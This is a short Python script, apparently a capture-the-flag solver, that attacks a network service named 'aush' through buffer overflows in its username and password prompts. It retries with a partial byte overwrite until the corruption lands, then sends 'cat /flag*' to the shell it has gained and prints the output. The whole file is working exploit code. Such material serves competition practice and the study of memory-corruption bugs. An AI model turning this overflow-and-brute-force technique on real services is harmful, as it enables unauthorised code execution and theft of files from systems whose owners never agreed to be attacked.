from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9006"))

while True:
    sock = Socket(HOST, PORT)
    #sock = Process("./aush", cwd="../distfiles")

    payload = b"A"*0x19a + b"\x00"
    sock.sendafter("Username: ", payload)

    try:
        payload = b"A"*0x15a + b"\x8b"
        sock.sendafter("Password: ", payload, timeout=1)
    except TimeoutError:
        logger.warning("Bad luck!")
        sock.close()
        continue

    time.sleep(1)
    sock.sendline("cat /flag*")
    l = sock.recvline()
    if b"stack smashing" not in l:
        print(l)
        sock.close()
        break

